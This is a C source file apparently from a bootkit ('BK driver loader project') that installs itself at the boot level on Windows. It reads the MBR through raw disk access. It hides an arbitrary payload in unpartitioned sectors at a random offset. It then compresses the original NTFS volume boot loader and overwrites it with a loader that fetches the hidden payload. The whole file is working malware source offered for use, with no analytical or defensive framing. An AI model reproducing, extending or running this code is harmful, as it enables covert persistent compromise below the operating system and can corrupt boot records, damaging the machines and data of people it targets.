//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.
//	
// module: install.c
// description: 
//	BK helper library. BK installation routines.


#include "..\bkgen\main.h"
#include "..\aplib.h"
#include "install.h"



//#define		_SCSI_IO		// defines IO type: either SCSI PATH THROUGH or direct drive read/write.

#define		OP_JMP_SHORT		0xeb

#define		wszPartition					L"\\Device\\Harddisk0\\Partition%u"
#define		wszPhysicalDrive0				L"\\??\\PHYSICALDRIVE0"

#define		SCSI_IO_READ_SECTOR		1
#define		SCSI_IO_WRITE_SECTOR	2

#pragma warning(disable:4996)	// 'mbstowcs': This function or variable may be unsafe. Consider using mbstowcs_s instead. 

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Reads or writes specified number of sectors from/to specified buffer using SCSI PATH THROUGH method.
//
static	BOOL	ScsiIo(
			   LPTSTR	Drive,		// drive name to read/write sectors from/to
			   PCHAR	Buffer,		// buffer to store the data
			   ULONG	Length,		// size of the buffer in bytes
			   ULONG	LBASector,	// starting LBA sector
			   ULONG	Count,		// number of sectors to read/write
			   ULONG	Flags		// variouse operation flags
			   )
{
	BOOL	Ret = FALSE;
	HANDLE		hDrive;
	WINERROR	Status;
	ULONG		bRead = 0, bLen = sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER);
	PSCSI_PASS_THROUGH_DIRECT Spt;
	PSCSI_PASS_THROUGH_DIRECT_WITH_BUFFER	Sptb;
	UCHAR	Direction, OpCode, OpCode16;

	if (Flags & SCSI_IO_WRITE_SECTOR)
	{
		Direction = SCSI_IOCTL_DATA_OUT;
		OpCode = SCSIOP_WRITE;
		OpCode16 = SCSIOP_WRITE16;
	}
	else
	{
		ASSERT(Flags & SCSI_IO_READ_SECTOR);
		Direction = SCSI_IOCTL_DATA_IN;
		OpCode = SCSIOP_READ;
		OpCode16 = SCSIOP_READ16;

	}	// if (Flags & SCSI_IO_READ)

	if (Spt = (PSCSI_PASS_THROUGH_DIRECT)malloc(bLen))
	{
		memset(Spt, 0, bLen);
		Sptb = (PSCSI_PASS_THROUGH_DIRECT_WITH_BUFFER)Spt;
		hDrive = CreateFile(Drive, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		if (hDrive != INVALID_HANDLE_VALUE)
		{
			Spt->Length = sizeof(SCSI_PASS_THROUGH_DIRECT);
			Spt->PathId = 0;
			Spt->TargetId = 0; 
			Spt->Lun = 0; 
			Spt->CdbLength = 16; 
			Spt->SenseInfoLength = SPTWB_SENSE_LENGTH; 
			Spt->DataIn = Direction;
			Spt->DataTransferLength = Length; 
			Spt->TimeOutValue = 200; 
			Spt->DataBuffer = Buffer; 
			Spt->SenseInfoOffset = (ULONG)((PCHAR)&Sptb->SenseInfoBuffer - (PCHAR)Sptb);

			// Formating CDB16
			if (LOBYTE(LOWORD(GetVersion())) > 5)
				// Vista and highter
				Spt->Cdb16.OperationCode = OpCode16;
			else
				// XP and w2k3
				Spt->Cdb16.OperationCode = OpCode;

			Spt->Cdb16.ForceUnitAccess = TRUE;

			Spt->Cdb16.LogicalBlock[0] = HIBYTE(HIWORD(LBASector));
			Spt->Cdb16.LogicalBlock[1] = LOBYTE(HIWORD(LBASector));
			Spt->Cdb16.LogicalBlock[2] = HIBYTE(LOWORD(LBASector));
			Spt->Cdb16.LogicalBlock[3] = LOBYTE(LOWORD(LBASector));

			Spt->Cdb16.TransferLength[0] = HIBYTE(HIWORD(Count));
			Spt->Cdb16.TransferLength[1] = LOBYTE(HIWORD(Count));
			Spt->Cdb16.TransferLength[2] = HIBYTE(LOWORD(Count));
			Spt->Cdb16.TransferLength[3] = LOBYTE(LOWORD(Count));

			Spt->Cdb16.Control = 0x10;
   
			// Sending SRB block to the device
			Status = DeviceIoControl(hDrive, IOCTL_SCSI_PASS_THROUGH_DIRECT, Spt, bLen, Spt, bLen, &bRead, NULL);
			if ((Status) && bRead < bLen)
				Ret = TRUE;
			else
				Status = GetLastError();
		
			CloseHandle(hDrive);
		}	// if (hDrive != INVALID_HANDLE_VALUE)

		free(Spt);
	}
   
   return(Ret);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Reads or writes specified number of sectors from/to specified buffer.
//
static	BOOL	DirectIo(
			   PWCHAR	Drive,			// drive name to read/write sectors from/to
			   PCHAR	Buffer,			// bufer to store the data
			   ULONG	Length,			// size of the buffer
			   ULONG	LBASector,		// starting LBA sector
			   ULONG	Count,			// number of sectors to read/write
			   ULONG	Flags			// variouse operation flags
			   )
{
	BOOL		Ret = FALSE;
	HANDLE		hDrive;
	NTSTATUS	ntStatus;
	OBJECT_ATTRIBUTES	oa = {0};
	UNICODE_STRING		us;
	IO_STATUS_BLOCK		IoStatus = {0};
	LARGE_INTEGER		FilePos = {0};
	HANDLE				hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	RtlInitUnicodeString(&us, Drive);
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if ((Count * BIOS_DEFAULT_SECTOR_SIZE) <= Length)
	{
		ntStatus = NtCreateFile(&hDrive, GENERIC_WRITE | GENERIC_READ, &oa, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL,
								FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);
	
		if (NT_SUCCESS(ntStatus))
		{
			FilePos.QuadPart = ((ULONGLONG)LBASector * BIOS_DEFAULT_SECTOR_SIZE);

			if (Flags & SCSI_IO_WRITE_SECTOR)
				ntStatus = NtWriteFile(hDrive, hEvent, NULL, NULL, &IoStatus, Buffer, (Count*BIOS_DEFAULT_SECTOR_SIZE), &FilePos, NULL);
			else
				ntStatus = NtReadFile(hDrive, hEvent, NULL, NULL, &IoStatus, Buffer, (Count*BIOS_DEFAULT_SECTOR_SIZE), &FilePos, NULL);

			if (ntStatus == STATUS_PENDING)
				WaitForSingleObject(hEvent, INFINITE);

			NtClose(hDrive);

			if (NT_SUCCESS(IoStatus.Status))
				Ret = TRUE;
		}	// if (hDrive != INVALID_HANDLE_VALUE)
	}	// 	if ((Count * BIOS_DEFAULT_SECTOR_SIZE) <= Length)
 
   return(Ret);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Reads or writes specified number of sectors from/to specified buffer.
//
static	BOOL  GetDriveGeometry(
						   PWCHAR			Drive,			// drive name to read/write sectors from/to
						   PDISK_GEOMETRY	DiskGeometry
			   )
{
	BOOL		Ret = FALSE;
	HANDLE		hDrive;
	NTSTATUS	ntStatus;
	OBJECT_ATTRIBUTES	oa = {0};
	UNICODE_STRING		us;
	IO_STATUS_BLOCK		IoStatus = {0};
	HANDLE				hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	RtlInitUnicodeString(&us, Drive);
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

	ntStatus = NtCreateFile(&hDrive, GENERIC_WRITE | GENERIC_READ, &oa, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL,
								FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);
	
	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = NtDeviceIoControlFile(hDrive, hEvent, NULL, NULL, &IoStatus, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, DiskGeometry, sizeof(DISK_GEOMETRY));
		if (ntStatus == STATUS_PENDING)
			WaitForSingleObject(hEvent, INFINITE);

		NtClose(hDrive);

		if (NT_SUCCESS(IoStatus.Status))
			Ret = TRUE;
	}	// if (NT_SUCCESS(ntStatus))
 
   return(Ret);
}


#define	ScsiReadSectors(Drive, Buffer, Length, Sector, Count)	ScsiIo(Drive, Buffer, Length, Sector, Count, SCSI_IO_READ_SECTOR)
#define	ScsiWriteSectors(Drive, Buffer, Length, Sector, Count)	ScsiIo(Drive, Buffer, Length, Sector, Count, SCSI_IO_WRITE_SECTOR)
#define	DirectReadSectors(Drive, Buffer, Length, Sector, Count)	DirectIo(Drive, Buffer, Length, Sector, Count, SCSI_IO_READ_SECTOR)
#define	DirectWriteSectors(Drive, Buffer, Length, Sector, Count) DirectIo(Drive, Buffer, Length, Sector, Count, SCSI_IO_WRITE_SECTOR)


#ifdef	_SCSI_IO
	#define	ReadSectors(a, b, c, d, e)	ScsiReadSectors(a, b, c, d, e)
	#define	WriteSectors(a, b, c, d, e)	ScsiWriteSectors(a, b, c, d, e)
#else
	#define	ReadSectors(a, b, c, d, e)	DirectReadSectors(a, b, c, d, e)
	#define	WriteSectors(a, b, c, d, e)	DirectWriteSectors(a, b, c, d, e)
#endif



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Packs specified source buffer of the specified size with binary data.
//	Stores packed data into the destination buffer. Returns destination buffer size.
//
static	ULONG	ApPack(
			 PCHAR SrcBuffer,		// source buffer
			 ULONG SrcLen,			// source buffer size
			 PCHAR* pDstBuffer		// destination buffer
			 )
{
	ULONG	wLen, pLen, PackedLen = 0;
	PCHAR	Packed = NULL, WorkSet = NULL;

	wLen = aP_workmem_size(SrcLen);
	pLen = aP_max_packed_size(SrcLen);

	if (Packed = Alloc(wLen + pLen))
	{
		WorkSet = Packed + pLen;
		memset(Packed, 0, pLen);

		if (PackedLen = aP_pack(SrcBuffer, Packed, SrcLen, WorkSet, NULL, NULL))
			*pDstBuffer = Packed;
		else
			Free(Packed);
	}	// if (Packed = Alloc(wLen + pLen))

	return(PackedLen);
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Trying to find loader entry point.
//	Looking for the first instruction within the loader. It should be "JMP SHORT" to the loader code
//
static	ULONG	GetCodeOffset(PUCHAR	Loader)
{
	ULONG	i, lSize;
	// Skipping loader header
	i = NTFS_LDR_HEADER_SIZE;
	lSize = BIOS_DEFAULT_SECTOR_SIZE;

	while (Loader[i] == 0)
		i += 1;

	if (Loader[i] == OP_JMP_SHORT)
	{
		i += Loader[i+1] + 2;
		ASSERT(Loader[i] != 0);
	}
	else
		i = 0;

	return(i);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Packs original OS loader and creates a new one containing BK and the packed one.
//
static	BOOL	BkCreateLoader(
					   PCHAR	Buffer,			// buffer to store newly created loader
					   ULONG	BufferLen,		// length of the buffer in bytes
					   PCHAR	Packed,			// packed part of the loader
					   ULONG	PackedLen,		// length of the packed part in bytes
					   PCHSS	TargetAddress	// target driver CHSS address
					   )
{
	BOOL	Ret = FALSE;
	HRSRC	hRs;
	HGLOBAL hRes;
	MEMORY_BASIC_INFORMATION	MemInfo = {0};

	// Querying current module base
	VirtualQuery(&BkCreateLoader, &MemInfo, sizeof(MEMORY_BASIC_INFORMATION));

	hRs = FindResource(MemInfo.AllocationBase, _T("VBR"), RT_RCDATA);

	// Loading resource containing BK loader
	if (hRs && (hRes = LoadResource(MemInfo.AllocationBase, hRs)))
	{
		PCHAR	Vbr = (PCHAR)LockResource(hRes);
		ULONG	VbrLen = SizeofResource(MemInfo.AllocationBase, hRs);

		if ((VbrLen + PackedLen) <= BufferLen)
		{
			ULONG i = 0;
			memcpy(Buffer, Vbr, VbrLen);

			for (i=0;i<VbrLen;i++)
			{
				if (Buffer[i] == (CHAR)BK_NAME_MAGIC && (*(PULONG)(&Buffer[i]) == BK_NAME_MAGIC))
					break;
			}	// for (i=0;i<VbrLen;i++)


			if (i < VbrLen)
			{
				memcpy(&Buffer[i], TargetAddress, sizeof(CHSS));		
				memcpy(Buffer + VbrLen, Packed, PackedLen);
				Ret = TRUE;
			}	// if (i < VbrLen)
		}	// if ((VbrLen + PackedLen) >= BufferLen)
	}	// if (hRs && (hRes = LoadResource(NULL, hRs)))

	return(Ret);
}


static BOOL	BkInstallPayloadFromBuffer(
			 					PCHAR	Payload,		
								ULONG	PayloadSize,
								PCHSS	PayloadAddress
								)
{
	BOOL	Ret = FALSE;
	PCHAR	Vbs	= NULL, Loader = NULL, Packed = NULL;
	PVBR	Vbr = NULL;
	ULONG	i, bSize = BIOS_DEFAULT_SECTOR_SIZE;
	PPARTITION_TABLE	PTable;
	ULONG	StartSector = 0, EndSector = 0, SectorSize = 0, PackedSize = 0;
	PWCHAR	TargetDrive = wszPhysicalDrive0;

	PCHAR	PayloadSectors = NULL;
	ULONG	PayloadSecSize;
	ULONG	RndSeed = GetTickCount();

	DISK_GEOMETRY	Dg = {0};


	do	// not a loop
	{
		if (!Payload || !PayloadAddress || !PayloadSize)
			break;

		if (!GetDriveGeometry(TargetDrive, &Dg))
			break;

		if (!(Vbs = Alloc(BIOS_DEFAULT_SECTOR_SIZE)))
			// Not enough memory
			break;

		// Reading MBR sector
		if (!ReadSectors(TargetDrive, Vbs, bSize, 0, 1))
			// Reading failed 
			break;

		// Check out we read a right one
		if (*(PUSHORT)(Vbs + BIOS_DEFAULT_SECTOR_SIZE - sizeof(USHORT)) != BIOS_MBR_MAGIC)
			// Wrong or corrupt sector loaded
			break;

		// Here we read the Driver Boot sector and searching for the Volume boot sector within it
		PTable = (PPARTITION_TABLE)(Vbs + BIOS_PARTITION_TABLE_OFFSET);
		
		// Calculating drive unpartitioned space
		for (i=0; i<BIOS_MAX_PARTITION_COUNT; i++)
		{
			if (PTable->Entry[i].ActiveFlag & BIOS_PARTITION_ACTIVE_FLAG)
			{
				if (StartSector == 0 || StartSector > PTable->Entry[i].LBAStartSector)
					StartSector = PTable->Entry[i].LBAStartSector;

				if (EndSector < (PTable->Entry[i].LBAStartSector + PTable->Entry[i].PartitionSize))
					EndSector = (PTable->Entry[i].LBAStartSector + PTable->Entry[i].PartitionSize);
			}
		}	// for (i=0; i<BIOS_MAX_PARTITION_COUNT; i++)

		PayloadSecSize =  (PayloadSize + (Dg.BytesPerSector -1))/Dg.BytesPerSector;

		if (((StartSector - 1)) > PayloadSecSize)
			StartSector = 1 + RtlRandom(&RndSeed)%((StartSector - 1) - PayloadSecSize);
		else
		{
			ULONG	DriveLastSector = Dg.Cylinders.LowPart * Dg.TracksPerCylinder * Dg.SectorsPerTrack;
			StartSector = DriveLastSector - PayloadSecSize - 2;
		}

		if (!(PayloadSectors = Alloc(PayloadSecSize * Dg.BytesPerSector)))
			// Not enough memory
			break;

		memcpy(PayloadSectors, Payload, PayloadSize);


		if (StartSector)
		{
			// Calculating Start sector CHSS address
			PayloadAddress->StartSector.QuadPart = (ULONGLONG)StartSector;
			PayloadAddress->NumberSectors = (USHORT)PayloadSecSize;
			// Writing payload to the disk
			Ret = WriteSectors(TargetDrive, PayloadSectors, (PayloadSecSize * Dg.BytesPerSector), StartSector, PayloadSecSize);
		}
	

	} while(FALSE);

	if (Vbs)
		Free(Vbs);

	if (PayloadSectors) 
		Free(PayloadSectors);

	return(Ret);
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Installs BK to load the specified driver.
//
BOOL	BkInstallVbr(
			PCHSS	PayloadAddress 
			)
{
	BOOL	Ret = FALSE;
	PCHAR	Vbs	= NULL, Loader = NULL, Packed = NULL;
	PVBR	Vbr = NULL;
	ULONG	i, CodeSize, bSize = BIOS_DEFAULT_SECTOR_SIZE;
	PPARTITION_TABLE	PTable;
	ULONG	StartSector = 0, SectorSize = 0, PackedSize = 0;
	WCHAR	TargetDrive[cstrlenW(wszPartition) + 1] = {0};

	wsprintfW(TargetDrive, wszPartition, 0);
	
	do	// not a loop
	{
		if (!(Vbs = Alloc(BIOS_DEFAULT_SECTOR_SIZE)))
			// Not enough memory
			break;

		// Reading MBR sector
		if (!ReadSectors(TargetDrive, Vbs, bSize, 0, 1))
			// Reading failed 
			break;

		// Check out we read a right one
		if (*(PUSHORT)(Vbs + BIOS_DEFAULT_SECTOR_SIZE - sizeof(USHORT)) != BIOS_MBR_MAGIC)
			// Wrong or corrupt sector loaded
			break;

		// Here we read the Driver Boot sector and searching for the Volume boot sector within it

		PTable = (PPARTITION_TABLE)(Vbs + BIOS_PARTITION_TABLE_OFFSET);
		i = 0;
		
		while(
			(i < BIOS_MAX_PARTITION_COUNT) && 
			(!(PTable->Entry[i].ActiveFlag & BIOS_PARTITION_ACTIVE_FLAG) || 
			(PTable->Entry[i].Descriptor != BIOS_PARTITION_TYPE_INSTALLABLE)))
			i += 1;

		if (i == BIOS_MAX_PARTITION_COUNT)
			// No bootable NTFS partition found
			break;
		
		bSize = BIOS_DEFAULT_SECTOR_SIZE;

#ifdef	_PHYSICAL_DRIVE
		StartSector = PTable->Entry[i].LBAStartSector;
#else
		wsprintfW(TargetDrive, wszPartition, (i + 1));
		StartSector = 0;
#endif

		if (!ReadSectors(TargetDrive, Vbs, bSize, StartSector, 1))
			// Reading failed
			break;


		Vbr = (PVBR)Vbs;
		if (memcmp(&Vbr->VolumeOemId, NTFS_OEM_ID, sizeof(NTFS_OEM_ID)))
			// Not a NTFS partition
			break;

		SectorSize = Vbr->Bpb.SectorSize;
		ASSERT(SectorSize == BIOS_DEFAULT_SECTOR_SIZE);

		bSize = (NTFS_LOADER_SIZE * SectorSize);
		if (!(Loader = Alloc(bSize)))
			// Not enough memory
			break;

		if (!ReadSectors(TargetDrive, Loader, bSize, (StartSector + 1), (NTFS_LOADER_SIZE - 1)))
			// Reading failed
			break;

		if (!(i = GetCodeOffset(Loader)))
			// Wrong or corrupt OS loader
			break;

		CodeSize = (NTFS_LOADER_SIZE - 1) * SectorSize - i;

		PackedSize = ApPack((Loader + i), CodeSize, &Packed);
		if (!PackedSize)
			// Packing failed
			break;

		if (!BkCreateLoader(Loader + i, CodeSize, Packed, PackedSize, PayloadAddress))
			// Failed to create loader
			break;

		if (WriteSectors(TargetDrive, Loader, bSize, (StartSector + 1), (NTFS_LOADER_SIZE - 1)))
			Ret = TRUE;
		
	} while(FALSE);

	if (Vbs)
		Free(Vbs);

	if (Loader)
		Free(Loader);

	if (Packed)
		Free(Packed);

	return(Ret);
}




BOOL	BkSetupWithPayload(
						PCHAR	Payload,
						ULONG	PayloadSize
						)
{
	BOOL	Ret = FALSE;
	CHSS	PayloadAddress = {0};

	if (BkInstallPayloadFromBuffer(Payload, PayloadSize, &PayloadAddress))
		Ret = BkInstallVbr(&PayloadAddress);
	
	return(Ret);
}